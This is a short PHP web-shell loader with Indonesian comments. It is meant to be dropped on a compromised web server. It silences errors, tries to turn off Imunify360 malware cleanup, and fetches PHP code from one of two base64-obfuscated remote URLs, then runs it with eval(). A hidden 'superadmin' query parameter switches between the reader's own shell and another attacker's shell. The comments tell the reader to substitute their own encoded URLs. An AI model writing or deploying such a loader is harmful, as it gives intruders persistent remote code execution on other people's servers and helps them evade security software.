<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('lsapi_backend_off', '1');
ini_set("imunify360.cleanup_on_restore", false);

function get_data($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    } else {
        return @file_get_contents($url);
    }
}

$x = '?>';

// ================================================================
// [ PERHATIAN! ] Ganti KEDUA Base64 di bawah ini dengan punya kamu!
// ================================================================
if (isset($_GET['superadmin'])) { 
    // ---------- BASE64 1 : SHELL PUNYA KAMU ----------
    $target_url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoZWxsMjMwNi9wZW5jYXJpa2VyYW5nL3JlZnMvaGVhZHMvbWFpbi91cGxvYWQucGhw');
} else {
    // ---------- BASE64 2 : SHELL ASLI PUNYA HACKER LAIN ----------
    // Ganti dengan URL shell dia (bisa link local server atau github) yang sudah di-base64
    $target_url = base64_decode('aHR0cHM6Ly9lbGVhcm5pbmcudW5pYi5hYy5pZC9jb2hvcnQvY2xhc3Nlcy9leHRlcm5hbC9jb2hvcnQucGhw');
}

eval($x . get_data($target_url));
?>
